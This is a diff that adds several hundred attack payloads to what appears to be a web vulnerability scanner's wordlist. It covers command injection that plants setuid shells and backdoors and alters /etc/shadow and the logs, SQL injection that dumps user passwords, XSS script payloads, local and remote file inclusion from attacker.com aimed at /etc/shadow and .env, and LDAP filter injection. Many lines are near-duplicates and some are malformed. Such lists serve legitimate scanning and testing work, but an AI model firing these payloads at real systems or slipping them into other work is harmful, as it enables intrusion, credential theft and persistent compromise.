@@ -65,3 +65,407 @@ icat#icat?*%0a/bin/cat%20/etc/passwd
 info2www#info2www?*%0a/bin/cat%20/etc/passwd
 Aglimpse#Aglimpse?*%0a/bin/cat%20/etc/passwd
 Man.sh#Man.sh?*%0a/bin/cat%20/etc/passwd
+CommandInjection#CommandInjection?/bin/cat /etc/passwd
+CommandInjection#CommandInjection?/bin/chmod 777 /etc/passwd
+CommandInjection#CommandInjection?/bin/chown *:* /etc/passwd
+CommandInjection#CommandInjection?/bin/chown root:root /tmp/backdoor
+CommandInjection#CommandInjection?/bin/chmod 755 /tmp/backdoor
+CommandInjection#CommandInjection?/bin/chown *:* /tmp/backdoor
+CommandInjection#CommandInjection?/bin/chmod 4777 /tmp/backdoor
+CommandInjection#CommandInjection?/bin/cp /bin/bash /tmp/
+CommandInjection#CommandInjection?/bin/chmod +s /tmp/bash
+CommandInjection#CommandInjection?/bin/chown $(whoami) /tmp/owned
+CommandInjection#CommandInjection?/bin/chmod +x /tmp/owned
+CommandInjection#CommandInjection?/bin/touch /tmp/owned
+CommandInjection#CommandInjection?/bin/chown *:* /var/www/html/backdoor.php
+CommandInjection#CommandInjection?/bin/chmod 755 /var/www/html/backdoor.php
+CommandInjection#CommandInjection?/bin/chown root:root /var/www/html/shell.php
+CommandInjection#CommandInjection?/bin/chmod 777 /var/www/html/shell.php
+CommandInjection#CommandInjection?/bin/chown *:* /var/www/html/shell.php
+CommandInjection#CommandInjection?/bin/chmod 644 /var/www/html/shell.php
+CommandInjection#CommandInjection?/bin/chown *:* /var/www/shell.php
+CommandInjection#CommandInjection?/bin/chmod 755 /var/www/shell.php
+CommandInjection#CommandInjection?/bin/chown *:* /var/www/html/shell.sh
+CommandInjection#CommandInjection?/bin/chmod 777 /var/www/html/shell.sh
+CommandInjection#CommandInjection?/bin/chown *:* /var/www/shell.sh
+CommandInjection#CommandInjection?/bin/chmod 755 /var/www/shell.sh
+CommandInjection#CommandInjection?/bin/chown *:* /var/www/html/shell.pl
+CommandInjection#CommandInjection?/bin/chmod 755 /var/www/html/shell.pl
+CommandInjection#CommandInjection?/bin/chown *:* /var/www/shell.pl
+CommandInjection#CommandInjection?/bin/chmod 755 /var/www/shell.pl
+CommandInjection#CommandInjection?/bin/chown *:* /tmp/shell.sh
+CommandInjection#CommandInjection?/bin/chmod 777 /tmp/shell.sh
+CommandInjection#CommandInjection?/bin/chown *:* /var/tmp/shell.sh
+CommandInjection#CommandInjection?/bin/chmod 755 /var/tmp/shell.sh
+CommandInjection#CommandInjection?/bin/chown *:* /tmp/shell.php
+CommandInjection#CommandInjection?/bin/chmod 755 /tmp/shell.php
+CommandInjection#CommandInjection?/bin/chown *:* /var/tmp/shell.php
+CommandInjection#CommandInjection?/bin/chmod 777 /var/tmp/shell.php
+CommandInjection#CommandInjection?/bin/chown *:* /var/backups/passwd
+CommandInjection#CommandInjection?/bin/chmod 644 /var/backups/passwd
+CommandInjection#CommandInjection?/bin/chown *:* /root/.bash_history
+CommandInjection#CommandInjection?/bin/chmod 666 /root/.bash_history
+CommandInjection#CommandInjection?/bin/chown *:* /home/user/.bashrc
+CommandInjection#CommandInjection?/bin/chmod 644 /home/user/.bashrc
+CommandInjection#CommandInjection?/bin/chown *:* /etc/shadow
+CommandInjection#CommandInjection?/bin/chmod 400 /etc/shadow
+CommandInjection#CommandInjection?/bin/chown *:* /etc/group
+CommandInjection#CommandInjection?/bin/chmod 644 /etc/group
+CommandInjection#CommandInjection?/bin/chown *:* /etc/hosts
+CommandInjection#CommandInjection?/bin/chmod 666 /etc/hosts
+CommandInjection#CommandInjection?/bin/chown *:* /etc/profile
+CommandInjection#CommandInjection?/bin/chmod 644 /etc/profile
+CommandInjection#CommandInjection?/bin/chown *:* /etc/profile.d/
+CommandInjection#CommandInjection?/bin/chmod -R 777 /etc/profile.d/
+CommandInjection#CommandInjection?/bin/chown *:* /etc/init.d/
+CommandInjection#CommandInjection?/bin/chmod 755 /etc/init.d/
+CommandInjection#CommandInjection?/bin/chown *:* /etc/cron.d/
+CommandInjection#CommandInjection?/bin/chmod 644 /etc/cron.d/
+CommandInjection#CommandInjection?/bin/chown *:* /etc/fstab
+CommandInjection#CommandInjection?/bin/chmod 644 /etc/fstab
+CommandInjection#CommandInjection?/bin/chown *:* /etc/passwd-
+CommandInjection#CommandInjection?/bin/chmod 644 /etc/passwd-
+CommandInjection#CommandInjection?/bin/chown *:* /etc/shadow-
+CommandInjection#CommandInjection?/bin/chmod 600 /etc/shadow-
+CommandInjection#CommandInjection?/bin/chown *:* /var/log/auth.log
+CommandInjection#CommandInjection?/bin/chmod 644 /var/log/auth.log
+CommandInjection#CommandInjection?/bin/chown *:* /var/log/syslog
+CommandInjection#CommandInjection?/bin/chmod 644 /var/log/syslog
+CommandInjection#CommandInjection?/bin/chown *:* /var/log/messages
+CommandInjection#CommandInjection?/bin/chmod 644 /var/log/messages
+SQLInjection#SQLInjection?' OR '1'='1
+SQLInjection#SQLInjection?1' UNION SELECT null, null FROM users
+SQLInjection#SQLInjection?1' UNION SELECT * FROM (SELECT * FROM users) a
+SQLInjection#SQLInjection?1' AND 1=0 UNION SELECT table_name FROM information_schema.tables WHERE table_schema='database_name'
+SQLInjection#SQLInjection?1' AND 1=0 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'
+SQLInjection#SQLInjection?1' AND 1=0 UNION SELECT CONCAT_WS(':', user, password) FROM users
+SQLInjection#SQLInjection?1' AND 1=0 UNION SELECT 1, GROUP_CONCAT(DISTINCT column_name) FROM information_schema.columns WHERE table_name='users'
+SQLInjection#SQLInjection?1' AND 1=0 UNION SELECT * FROM users WHERE 1=CAST((SELECT * FROM (SELECT SLEEP(5))) AS UNSIGNED)
+SQLInjection#SQLInjection?1' AND 1=0; --
+SQLInjection#SQLInjection?1' AND (SELECT * FROM (SELECT SLEEP(5)) a) AND '1
+SQLInjection#SQLInjection?1' AND (SELECT 1 FROM (SELECT SLEEP(5)) a) AND '1
+SQLInjection#SQLInjection?1' AND (SELECT COUNT(*) FROM (SELECT SLEEP(5)) a) AND '1
+SQLInjection#SQLInjection?1' AND (SELECT BENCHMARK(5000000, ENCODE('test', 'test'))) AND '1
+SQLInjection#SQLInjection?1' AND (SELECT * FROM (SELECT SLEEP(5)) a JOIN users ON 1) AND '1
+SQLInjection#SQLInjection?1' AND (SELECT * FROM (SELECT SLEEP(5)) a WHERE 1 AND users.id=1) AND '1
+SQLInjection#SQLInjection?1' AND (SELECT * FROM (SELECT SLEEP(5)) a WHERE 1 AND users.username='admin') AND '1
+SQLInjection#SQLInjection?1' AND (SELECT * FROM (SELECT SLEEP(5)) a WHERE 1 AND users.password=PASSWORD('password')) AND '1
+SQLInjection#SQLInjection?1' AND (SELECT * FROM users WHERE 1 AND SLEEP(5)) AND '1
+SQLInjection#SQLInjection?1' AND (SELECT * FROM users WHERE 1 AND (SELECT * FROM (SELECT SLEEP(5)) a)) AND '1
+SQLInjection#SQLInjection?1' AND (SELECT * FROM users WHERE 1 AND BENCHMARK(5000000, ENCODE('test', 'test'))) AND '1
+SQLInjection#SQLInjection?1' AND (SELECT * FROM users WHERE 1 AND (SELECT COUNT(*) FROM information_schema.tables)) AND '1
+SQLInjection#SQLInjection?1' AND (SELECT * FROM users WHERE 1 AND (SELECT * FROM information_schema.tables LIMIT 1)) AND '1
+SQLInjection#SQLInjection?1' AND (SELECT * FROM users WHERE 1 AND (SELECT table_name FROM information_schema.tables LIMIT 1)) AND '1
+SQLInjection#SQLInjection?1' AND (SELECT * FROM users WHERE 1 AND (SELECT column_name FROM information_schema.columns LIMIT 1)) AND '1
+SQLInjection#SQLInjection?1' AND (SELECT * FROM users WHERE 1 AND (SELECT CONCAT_WS(':', user, password) FROM users LIMIT 1)) AND '1
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT * FROM users
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT * FROM admin
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT CONCAT(user, 0x3a, password) FROM users
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='database_name') FROM users
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users') FROM users
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users LIMIT 1), (SELECT password FROM users LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users LIMIT 1 OFFSET 1), (SELECT password FROM users LIMIT 1 OFFSET 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user='admin' LIMIT 1), (SELECT password FROM users WHERE user='admin' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%admin%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%admin%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user REGEXP 'admin' LIMIT 1), (SELECT password FROM users WHERE user REGEXP 'admin' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%@%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%@%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%_%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%_%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%-%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%-%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%"%' ESCAPE '' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%"%' ESCAPE '' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%\'%' ESCAPE '\' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%\'%' ESCAPE '\' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%[%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%[%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%]%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%]%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%`%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%`%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%\%' ESCAPE '' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%\%' ESCAPE '' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%&%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%&%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%*%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%*%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%?%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%?%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%;%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%;%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%|%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%|%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%<%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%<%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%>%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%>%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%{%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%{%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%}%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%}%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%(%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%(%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%)%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%)%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%=%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%=%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%+%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%+%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%-%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%-%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%!%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%!%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%~%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%~%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%^%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%^%' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%\%' ESCAPE '' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%\%' ESCAPE '' LIMIT 1)
+SQLInjection#SQLInjection?1' AND 1=0 UNION ALL SELECT 1, (SELECT user FROM users WHERE user LIKE '%%' LIMIT 1), (SELECT password FROM users WHERE user LIKE '%%' LIMIT 1)
+XSS#XSS?<script>alert('XSS')</script>
+XSS#XSS?<img src=x onerror=alert('XSS')>
+XSS#XSS?<iframe src=javascript:alert('XSS')>
+XSS#XSS?<style>@import'javascript:alert("XSS")';</style>
+XSS#XSS?<body onload=alert('XSS')>
+XSS#XSS?<svg onload=alert('XSS')>
+XSS#XSS?<link rel=stylesheet href=javascript:alert('XSS')>
+XSS#XSS?<script>eval(location.hash.slice(1))</script>
+XSS#XSS?<script>fetch(atob('aW5wdXQgbmFtZQ=='))</script>
+XSS#XSS?<script>setTimeout('alert("XSS")', 100)</script>
+XSS#XSS?<script>setInterval('alert("XSS")', 100)</script>
+XSS#XSS?<script>document.write('<script>alert("XSS")</script>')</script>
+XSS#XSS?<script>document.createElement('img').src='javascript:alert("XSS")'</script>
+XSS#XSS?<script>document.location='javascript:alert("XSS")';</script>
+XSS#XSS?<script>history.pushState(0,0,'javascript:alert("XSS")');</script>
+XSS#XSS?<script>history.replaceState(0,0,'javascript:alert("XSS")');</script>
+XSS#XSS?<script>top.location='javascript:alert("XSS")';</script>
+XSS#XSS?<script>top.document.write('<script>alert("XSS")</script>')</script>
+XSS#XSS?<script>top.document.createElement('img').src='javascript:alert("XSS")';</script>
+XSS#XSS?<script>top.setTimeout('alert("XSS")', 100)</script>
+XSS#XSS?<script>top.setInterval('alert("XSS")', 100)</script>
+XSS#XSS?<script>top.execScript('alert("XSS")', 'javascript');</script>
+XSS#XSS?<script>top.al~rt('XSS');</script>
+XSS#XSS?<script>top.open('javascript:alert("XSS")');</script>
+XSS#XSS?<script>top.showModalDialog('javascript:alert("XSS")');</script>
+XSS#XSS?<script>top.postMessage('XSS', '*');</script>
+XSS#XSS?<script>top.opener.document.write('<script>alert("XSS")</script>')</script>
+XSS#XSS?<script>top.opener.document.createElement('img').src='javascript:alert("XSS")';</script>
+XSS#XSS?<script>top.opener.setTimeout('alert("XSS")', 100)</script>
+XSS#XSS?<script>top.opener.setInterval('alert("XSS")', 100)</script>
+XSS#XSS?<script>top.opener.execScript('alert("XSS")', 'javascript');</script>
+XSS#XSS?<script>top.opener.al~rt('XSS');</script>
+XSS#XSS?<script>top.opener.open('javascript:alert("XSS")');</script>
+XSS#XSS?<script>top.opener.showModalDialog('javascript:alert("XSS")');</script>
+XSS#XSS?<script>top.opener.postMessage('XSS', '*');</script>
+XSS#XSS?<script>parent.document.write('<script>alert("XSS")</script>')</script>
+XSS#XSS?<script>parent.document.createElement('img').src='javascript:alert("XSS")';</script>
+XSS#XSS?<script>parent.setTimeout('alert("XSS")', 100)</script>
+XSS#XSS?<script>parent.setInterval('alert("XSS")', 100)</script>
+XSS#XSS?<script>parent.execScript('alert("XSS")', 'javascript');</script>
+XSS#XSS?<script>parent.al~rt('XSS');</script>
+XSS#XSS?<script>parent.open('javascript:alert("XSS")');</script>
+XSS#XSS?<script>parent.showModalDialog('javascript:alert("XSS")');</script>
+XSS#XSS?<script>parent.postMessage('XSS', '*');</script>
+XSS#XSS?<script>self.document.write('<script>alert("XSS")</script>')</script>
+XSS#XSS?<script>self.document.createElement('img').src='javascript:alert("XSS")';</script>
+XSS#XSS?<script>self.setTimeout('alert("XSS")', 100)</script>
+XSS#XSS?<script>self.setInterval('alert("XSS")', 100)</script>
+XSS#XSS?<script>self.execScript('alert("XSS")', 'javascript');</script>
+XSS#XSS?<script>self.al~rt('XSS');</script>
+XSS#XSS?<script>self.open('javascript:alert("XSS")');</script>
+XSS#XSS?<script>self.showModalDialog('javascript:alert("XSS")');</script>
+XSS#XSS?<script>self.postMessage('XSS', '*');</script>
+XSS#XSS?<script>onerror=alert('XSS') src=x
+XSS#XSS?<script>onload=alert('XSS') src=x
+XSS#XSS?<script>onmouseover=alert('XSS') src=x
+XSS#XSS?<script>onclick=alert('XSS') src=x
+XSS#XSS?<script>onfocus=alert('XSS') src=x
+XSS#XSS?<script>onblur=alert('XSS') src=x
+XSS#XSS?<script>onchange=alert('XSS') src=x
+XSS#XSS?<script>onsubmit=alert('XSS') src=x
+XSS#XSS?<script>onreset=alert('XSS') src=x
+XSS#XSS?<script>onload=alert('XSS')>
+XSS#XSS?<script>onerror=alert('XSS')>
+XSS#XSS?<script>onmouseover=alert('XSS')>
+XSS#XSS?<script>onclick=alert('XSS')>
+XSS#XSS?<script>onfocus=alert('XSS')>
+XSS#XSS?<script>onblur=alert('XSS')>
+XSS#XSS?<script>onchange=alert('XSS')>
+XSS#XSS?<script>onsubmit=alert('XSS')>
+XSS#XSS?<script>onreset=alert('XSS')>
+XSS#XSS?<a href="javascript:alert('XSS')">Click me</a>
+XSS#XSS?<div style="width:100%;height:100%;position:fixed;left:0;top:0;z-index:9999" onmouseover="alert('XSS')"></div>
+XSS#XSS?<div style="font-family:'foo&#110;bar';">This input field has a XSS: <input></div>
+XSS#XSS?<div style="font-family:'foo[\0]bar';">This input field has a XSS: <input></div>
+XSS#XSS?<div style="font-family:'foo\0bar';">This input field has a XSS: <input></div>
+XSS#XSS?<div style="font-family:\0">This input field has a XSS: <input></div>
+FileInclusion#FileInclusion?../../../../etc/passwd
+FileInclusion#FileInclusion?/etc/shadow
+FileInclusion#FileInclusion?/etc/hosts
+FileInclusion#FileInclusion?/etc/fstab
+FileInclusion#FileInclusion?/etc/passwd%00
+FileInclusion#FileInclusion?../../../../var/www/html/index.html
+FileInclusion#FileInclusion?http://example.com/shell.txt
+FileInclusion#FileInclusion?file:///etc/passwd
+FileInclusion#FileInclusion?http://attacker.com/malicious.txt
+FileInclusion#FileInclusion?../config/database.php
+FileInclusion#FileInclusion?../../../../../var/www/html/config.php
+FileInclusion#FileInclusion?../../../../etc/sudoers
+FileInclusion#FileInclusion?http://example.com/secrets.txt
+FileInclusion#FileInclusion?file:///var/www/html/secrets.txt
+FileInclusion#FileInclusion?http://attacker.com/remote.txt
+FileInclusion#FileInclusion?../include/config.php
+FileInclusion#FileInclusion?../../../../var/www/html/include.php
+FileInclusion#FileInclusion?http://example.com/hidden/admin.php
+FileInclusion#FileInclusion?file:///var/www/html/hidden/admin.php
+FileInclusion#FileInclusion?http://attacker.com/hidden/credentials.php
+FileInclusion#FileInclusion?../../../../../var/www/html/.htaccess
+FileInclusion#FileInclusion?http://example.com/.htpasswd
+FileInclusion#FileInclusion?file:///var/www/html/.htpasswd
+FileInclusion#FileInclusion?http://attacker.com/.htaccess
+FileInclusion#FileInclusion?../../../../../var/www/html/backup/config.tar.gz
+FileInclusion#FileInclusion?http://example.com/backup/config.zip
+FileInclusion#FileInclusion?file:///var/www/html/backup/config.zip
+FileInclusion#FileInclusion?http://attacker.com/backup/config.tar.gz
+FileInclusion#FileInclusion?../../../../../var/www/html/log/access.log
+FileInclusion#FileInclusion?http://example.com/log/error.log
+FileInclusion#FileInclusion?file:///var/www/html/log/error.log
+FileInclusion#FileInclusion?http://attacker.com/log/access.log
+FileInclusion#FileInclusion?../../../../../var/www/html/uploads/shell.php
+FileInclusion#FileInclusion?http://example.com/uploads/malicious.php
+FileInclusion#FileInclusion?file:///var/www/html/uploads/malicious.php
+FileInclusion#FileInclusion?http://attacker.com/uploads/shell.php
+FileInclusion#FileInclusion?../../../../../var/www/html/tmp/sensitive_data
+FileInclusion#FileInclusion?http://example.com/tmp/sensitive_info
+FileInclusion#FileInclusion?file:///var/www/html/tmp/sensitive_info
+FileInclusion#FileInclusion?http://attacker.com/tmp/sensitive_data
+FileInclusion#FileInclusion?../../../../../var/www/html/storage/framework/views
+FileInclusion#FileInclusion?http://example.com/storage/framework/sessions
+FileInclusion#FileInclusion?file:///var/www/html/storage/framework/sessions
+FileInclusion#FileInclusion?http://attacker.com/storage/framework/views
+FileInclusion#FileInclusion?../../../../../var/www/html/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+FileInclusion#FileInclusion?http://example.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+FileInclusion#FileInclusion?file:///var/www/html/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+FileInclusion#FileInclusion?http://attacker.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+FileInclusion#FileInclusion?../../../../../var/www/html/.env
+FileInclusion#FileInclusion?http://example.com/.env
+FileInclusion#FileInclusion?file:///var/www/html/.env
+FileInclusion#FileInclusion?http://attacker.com/.env
+FileInclusion#FileInclusion?../../../../../var/www/html/old_versions/index.php
+FileInclusion#FileInclusion?http://example.com/old_versions/config.php
+FileInclusion#FileInclusion?file:///var/www/html/old_versions/config.php
+FileInclusion#FileInclusion?http://attacker.com/old_versions/index.php
+FileInclusion#FileInclusion?../../../../../var/www/html/maintenance.php
+FileInclusion#FileInclusion?http://example.com/install.php
+FileInclusion#FileInclusion?file:///var/www/html/install.php
+FileInclusion#FileInclusion?http://attacker.com/maintenance.php
+FileInclusion#FileInclusion?../../../../../var/www/html/test.php
+FileInclusion#FileInclusion?http://example.com/debug.php
+FileInclusion#FileInclusion?file:///var/www/html/debug.php
+FileInclusion#FileInclusion?http://attacker.com/test.php
+LDAPInjection#LDAPInjection?(&(objectClass=*)(|(uid=*)))
+LDAPInjection#LDAPInjection?(|(uid=*)))
+LDAPInjection#LDAPInjection?(|(!(uid=*)))
+LDAPInjection#LDAPInjection?*)(|(uid=*)))
+LDAPInjection#LDAPInjection?(|(uid=*))(
+LDAPInjection#LDAPInjection?(&(uid=*))(|(objectClass=*)))
+LDAPInjection#LDAPInjection?(&(objectClass=*))(|(uid=*)))
+LDAPInjection#LDAPInjection?(|(uid=*))(&(objectClass=*)))
+LDAPInjection#LDAPInjection?(&(!(uid=*)))(|(objectClass=*)))
+LDAPInjection#LDAPInjection?(&(objectClass=*))(|(!(uid=*))))
+LDAPInjection#LDAPInjection?(|(objectClass=*))(&(uid=*)))
+LDAPInjection#LDAPInjection?(|(!(uid=*)))(&(objectClass=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(objectClass=person)))
+LDAPInjection#LDAPInjection?(&(objectClass=person))(|(uid=*)))
+LDAPInjection#LDAPInjection?(|(uid=*))(&(objectClass=inetOrgPerson)))
+LDAPInjection#LDAPInjection?(&(objectClass=inetOrgPerson))(|(uid=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(objectClass=organizationalPerson)))
+LDAPInjection#LDAPInjection?(&(objectClass=organizationalPerson))(|(uid=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(objectClass=*))(!(objectClass=computer)))
+LDAPInjection#LDAPInjection?(&(objectClass=*))(|(uid=*))(!(objectClass=computer)))
+LDAPInjection#LDAPInjection?(|(uid=*))(&(objectClass=*))(!(objectCategory=computer)))
+LDAPInjection#LDAPInjection?(&(objectCategory=*))(|(uid=*))(!(objectClass=computer)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(objectCategory=person))(!(objectClass=computer)))
+LDAPInjection#LDAPInjection?(&(objectCategory=person))(|(uid=*))(!(objectClass=computer)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(objectCategory=inetOrgPerson))(!(objectClass=computer)))
+LDAPInjection#LDAPInjection?(&(objectCategory=inetOrgPerson))(|(uid=*))(!(objectClass=computer)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(objectCategory=organizationalPerson))(!(objectClass=computer)))
+LDAPInjection#LDAPInjection?(&(objectCategory=organizationalPerson))(|(uid=*))(!(objectClass=computer)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(sn=*)))
+LDAPInjection#LDAPInjection?(&(sn=*))(|(uid=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(cn=*)))
+LDAPInjection#LDAPInjection?(&(cn=*))(|(uid=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(givenName=*)))
+LDAPInjection#LDAPInjection?(&(givenName=*))(|(uid=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(sn=*))(|(cn=*))))
+LDAPInjection#LDAPInjection?(&(sn=*))(|(uid=*))(|(cn=*))))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(sn=*))(|(givenName=*))))
+LDAPInjection#LDAPInjection?(&(givenName=*))(|(uid=*))(|(sn=*))))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(cn=*))(|(givenName=*))))
+LDAPInjection#LDAPInjection?(&(cn=*))(|(uid=*))(|(givenName=*))))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(mail=*)))
+LDAPInjection#LDAPInjection?(&(mail=*))(|(uid=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(telephoneNumber=*)))
+LDAPInjection#LDAPInjection?(&(telephoneNumber=*))(|(uid=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(homePhone=*)))
+LDAPInjection#LDAPInjection?(&(homePhone=*))(|(uid=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(mobile=*)))
+LDAPInjection#LDAPInjection?(&(mobile=*))(|(uid=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(ipPhone=*)))
+LDAPInjection#LDAPInjection?(&(ipPhone=*))(|(uid=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(pager=*)))
+LDAPInjection#LDAPInjection?(&(pager=*))(|(uid=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(facsimileTelephoneNumber=*)))
+LDAPInjection#LDAPInjection?(&(facsimileTelephoneNumber=*))(|(uid=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(street=*)))
+LDAPInjection#LDAPInjection?(&(street=*))(|(uid=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(l=*)))
+LDAPInjection#LDAPInjection?(&(l=*))(|(uid=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(st=*)))
+LDAPInjection#LDAPInjection?(&(st=*))(|(uid=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(o=*)))
+LDAPInjection#LDAPInjection?(&(o=*))(|(uid=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(ou=*)))
+LDAPInjection#LDAPInjection?(&(ou=*))(|(uid=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(postalCode=*)))
+LDAPInjection#LDAPInjection?(&(postalCode=*))(|(uid=*)))
+LDAPInjection#LDAPInjection?(&(uid=*))(|(postalAddress=*)))
